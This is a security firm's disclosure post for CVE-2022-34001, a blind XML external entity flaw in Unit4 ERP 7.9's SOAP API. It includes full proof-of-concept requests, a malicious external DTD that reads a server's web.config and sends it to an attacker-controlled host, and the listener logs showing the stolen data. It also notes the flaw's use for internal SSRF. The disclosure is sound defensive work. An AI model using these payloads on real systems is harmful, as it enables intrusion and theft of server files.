=== Content from prisminfosec.com_b5767f78_20250114_202747.html ===


![](https://secure.perk0mean.com/177023.png)

[Experiencing a Security Breach?](https://prisminfosec.com/have-you-had-a-security-breach/)
contact@prisminfosec.com +44 (0) 1242 652 100 [+44 (0) 1242 652 100](/get-in-touch)

Search

[![PrismInfosec](https://prisminfosec.com/wp-content/themes/prisminfosec/img/logo.svg)](/)

* [Home](/)
* [LuxisAI](https://prisminfosec.com/luxisai/)
* [Services](https://prisminfosec.com/service-select/)
  + [Cyber Security Assessments and Penetration Testing

    Test your information security controls and ascertain weaknesses and vulnerabilities.](https://prisminfosec.com/service/cyber-security-assessments-and-penetration-testing/)
  + [Cloud Security

    Manage the risks associated with procuring, migrating or delivering cloud services.](https://prisminfosec.com/service/cloud-security/)
  + [Red Teaming & Simulated Attack

    Test and assess your organisation’s susceptibility to real-world attacks by sophisticated threat actors](https://prisminfosec.com/service/red-teaming-simulated-attack/)
  + [GRC & Security Consulting

    Engage a Prism Infosec security consultant to help manage your cyber security risks.](https://prisminfosec.com/service/information-security-consulting/)
  + [Managed Security Services

    Managed security services providing comprehensive, outsourced monitoring and management of your organisation’s security infrastructure.](https://prisminfosec.com/service/managed-security-services/)
  + [Incident Management and Response Services (CSIR)

    Get the support you need when the worst happens and ensure your business is well prepared to deal with cyber incidents ahead of time.](https://prisminfosec.com/service/incident-response-services-csir/)
* [Latest News](https://prisminfosec.com/news/)
* [Careers](https://prisminfosec.com/careers/)
* [Contact](https://prisminfosec.com/get-in-touch/)
* [About us](https://prisminfosec.com/about-us/)

## LATEST CYBER SECURITY NEWS AND VIEWS

[Home](%5C) > [News](%5Cnews) >
CVE-2022-34001 – XML External Entity (XXE) in Unit 4 ERP 7.9 (Also Known As “Agresso”)
## Latest news

# CVE-2022-34001 – XML External Entity (XXE) in Unit 4 ERP 7.9 (Also Known As “Agresso”)

Posted on 19th July 2022 by Prism Infosec

![](https://prisminfosec.com/wp-content/uploads/2022/07/Latest-News-website-10.png)

Prism Infosec Identified an XXE vulnerability within Unit4’s Enterprise Resource Planning (ERP) software. This has been assigned CVE-2022-34001. Unit4’s ERP software is a well-known enterprise management suite, which includes financial and project management tools.

Prism Infosec discovered a blind XXE within a specific function of the ERP software. This would allow an authenticated attacker to read arbitrary files from the host server.

## **CVE-2022-34001 – Proof of Concept**

The ERP API supported the use of SOAP calls; Curiously, the ‘ExecuteServerProcessAsynchronously’ SOAP call allowed the insertion of arbitrary XML within its body.  To test for XXE, Prism used a simple HTTP outbound call to a Burp Collaborator server to confirm that the XML allowed for entity expansion, and also allowed the SYSTEM call.

The following request shows a snippet of the ‘ExecuteServerProcessAsynchronously’ SOAP call with the embedded XXE payload within XML tags:

`POST /BusinessWorld-webservicestest/service.svc HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: http://REDACTED/ImportService/ImportV200606/ExecuteServerProcessAsynchronously
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Host: api-services.redacted.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 743

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<ExecuteServerProcessAsynchronously xmlns="http://REDACTED/ImportService/ImportV200606">
<input>
<ServerProcessId>GL07</ServerProcessId>
<MenuId>BI88</MenuId>
</Variant>
        <Xml>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://burp_collaborator.com"> %dtd;]><xxx/>]]>
</Xml>
      </input>
<credentials>
…[REDACTED]…
</credentials>`

This resulted in an HTTP request to the Prism Infosec controlled server:

`The request was received from IP address [REDACTED] at 2022-Mar-01 11:24:45 UTC.

GET / HTTP/1.1
Host: burp_collaborator.com`

`Connection: Keep-Alive`

This confirms that entity expansion was enabled, along with being able to leverage protocols such as HTTP and FILE. As SOAP request only responded with an error message, this attack was considered ‘blind’ – so out of band techniques were required to exfiltrate data from the host.

On an attacker-controlled server, the following malicious DTD file was hosted (test.xml):

`<!ENTITY % start "<[CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % outfile SYSTEM "file:///E:\Program Files\UNIT4 Business World On! (v7)\Web Api\web.config">
<!ENTITY % goout "<!ENTITY &#37; pop SYSTEM 'http://attacker_controlled_server:8000/%start;%outfile;
%end;'>">`

The SOAP call was then initiated but referencing the malicious DTD along with the parameter entities to exfiltrate the data:

`POST /BusinessWorld-webservicestest/service.svc HTTP/1.1
Content-Type: text/xml; charset=utf-8
SOAPAction: http://REDACTED/ImportService/ImportV200606/ExecuteServerProcessAsynchronously
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Host: api-services.redacted.com
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 743

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<ExecuteServerProcessAsynchronously xmlns="http://REDACTED/ImportService/ImportV200606">
<input>
<ServerProcessId>GL07</ServerProcessId>
<MenuId>BI88</MenuId>
<Variant>104</Variant>
<Xml>
<![CDATA[
<!DOCTYPE doc[
<!ENTITY % dtd SYSTEM "http://attacker_controlled_server:8000/test.xml">
%dtd;
%goout;
%pop;
]>
]]>
</Xml>
</input>
--[Cut]--`

On the attacker controlled server, a listener was set up to serve the malicious DTD, and also catch the contents of the file being read:

`Serving HTTP on 0.0.0.0 port 8000 ...
api-services_ip - - [02/Mar/2022 12:54:16] "GET /test.xml HTTP/1.1" 200 -
api-services_ip - - [02/Mar/2022 12:54:04] "GET /%3C[CDATA[%0D%0A%3C!--%0D%0A%20%20For%20more%20information%20on%20how%20to%20configure%20your%20ASP.NET%20application,`

`%20please%20visit%20%0D%0A%20%20http://go.microsoft.com/fwlink/?LinkId=301879%0D%0A%20%20--%3E%0D%0A%3Cconfiguration%3E%0D%0A%20%20%3CconfigSections`

`--[Cut]--`

The decoded data reveals the content of the “E:\Program Files\UNIT4 Business World On! (v7)\Web Api\web.config” file on the api-services host:

/`<[CDATA[
<!--
  For more information on how to configure your ASP.NET application, please visit
  http://go.microsoft.com/fwlink/?LinkId=301879
  -->
<configuration>
  <configSections>
    <section name="agresso.web.api" type="Agresso.Web.Http.Configuration.WebApi.WebApiConfigurationSection, Agresso.Web.Http" />
  </configSections>
--[Cut]—`

The XXE could also be leveraged to make Server-Side Request Forgery (SSRF) calls within the internal network; mapping out the internal network, and making arbitrary requests to any internal hosts.

Prism Infosec contacted the vendor (Unit 4); and supplied all the necessary information so that Unit 4 could confirm and subsequently remediate the vulnerability. Unit 4 responded in a timely matter and started working on a fix for all customers.

**Although the test was completed on the latest version of Unit 4 ERP, we have been advised that previous versions of the software may also be affected.**

**Note:**Prism Infosec did not confirm if the vulnerability had been patched; No further testing was conducted after the initial engagement.

**Timeline – CVE-2022-34001**

* Discovered by Prism Infosec during an engagement for client: March 1st 2022
* Vendor Informed: March 17th 2022
* CVE Assigned: June 19th 2022
* Vendor Confirmed Fix, and communicated to customers: July 7th 2022
* Prism Infosec Blog Post: July 19th 2022

Vulnerability was discovered and written by Alexis Vanden Eijnde of Prism Infosec.

[PREVIOUS POST](https://prisminfosec.com/?post_type=post&p=758)
[NEXT POST](https://prisminfosec.com/?post_type=post&p=799)

## FILTER RESULTS

Browse posts by category:
Select category...
Security Vulnerability Update
Cyber security assessments
Cloud security
Information security consulting
Blog Posts
Prism Infosec News
Uncategorised

Browse posts by date:
Select date...
January 2025December 2024November 2024October 2024September 2024August 2024July 2024June 2024May 2024April 2024February 2024January 2024October 2023June 2023March 2023January 2023July 2022May 2022April 2022January 2022December 2021November 2021October 2021February 2021September 2020July 2020June 2020April 2020March 2020January 2020August 2019July 2019May 2019April 2019January 2019November 2018September 2018June 2018January 2018June 2017

Browse posts by tag:
Select tag...
PCI
QSA
Conference
Networking Attacks
Exploits
Cyber Security
Top 3
Phishing
DoS
DDoS
RDP
Remote Desktop
home working
remote working
Assure
CREST
CAA
Civil Aviation Authority
star
red team
penetration testing
CVE-2020-1472
Zerologon
Microsoft Windows
Active Directory
CHECK
NCSC
Green Light
IT Health Checks
ssh
shell
pentest
growth
Security
Vulnerability
Critical
2022
predictions
threats
priorities
Ransomware
Hacked
Compromised
Exploited
Extortion
Blackmail
Cybersecurity
Encrypted Files
Data Leak
Security Incident
Incident Response
Microsoft Word Remote Code Execution Vulnerability
CVE-2023-21716
outlook
cve-2023-23397
microsoft
elevation of privilege
compromise
ABB
vulnerabiility
Matrix
CVE-2023-0635
CVE-2023-0639
aspect
nexus
coo
chief operating officer
new hire
CVE
wordpress
Game hacking
reverse engineering
hacking
PDF exploit
SSRF
XSS
PDF
AI Large Language Models
AI
Large Language Model
Ethical Implications
Bias in datasets
Prompt Injection
(LLMs)
Cybercriminals
deepfake
wormgpt
cybercrime
data pollution
LLMs
datasets
Threat Detection
Blue Team
JulAI
Crowdstrike Incident
recovery
GPO
Crowdstrike
Chat Injection
Artificial Intelligence
Big Brother
RCE
WPScan
Cyber Security Threat Protection
STAR-FS
BSides London
Social Engineering
Vishing
Smishing
threat actor
black swan
cyber attack
Cyber Threat
Physical Testing
Physical Red Teaming
Data Breach
common issues
threat protection

## Latest tweets

[Prism Infosec](https://twitter.com/prisminfosec)
[@prisminfosec](https://twitter.com/prisminfosec)
·
[16 Dec](https://twitter.com/prisminfosec/status/1868713639190184400)

A great conference @BSidesLondon, thanks for having us at #BSidesLDN2024! Looking forward to continuing the relationship next year!

[Prism Infosec](https://twitter.com/prisminfosec)
[@prisminfosec](https://twitter.com/prisminfosec)
·
[26 Nov](https://twitter.com/prisminfosec/status/1861362493051879676)

Prism Infosec is proud to be a gold sponsor of @BSidesLondon 2024! Come and visit us on our stand and join in our cyber scavenger hunt! #CyberSecurity #bsides

## Sign up to our newsletter

* Name\*
* Company name
* Email\*
* Fields marked with an \* are mandatory
* NameThis field is for validation purposes and should be left unchanged.

© Prism Infosec Ltd 2024, a company registered in England and Wales #5985734. VAT Registration Number: GB 879 7957 24

Prism Infosec Ltd, Suite 1003/1004, Eagle Tower, Montpellier Drive, Cheltenham, Gloucestershire, GL50 1TA

+44 (0) 1242 652100 | [Privacy Policy](/privacy-policy) | [Cookie Policy](/cookie-policy) | contact@prisminfosec.com

[![Twitter](https://prisminfosec.com/wp-content/themes/prisminfosec/img/icons/twitter.svg)](https://twitter.com/prisminfosec)[![Linkedin](https://prisminfosec.com/wp-content/themes/prisminfosec/img/icons/linkedin.svg)](https://www.linkedin.com/company/prism-infosec-ltd/)

![](https://px.ads.linkedin.com/collect/?pid=6214354&fmt=gif)


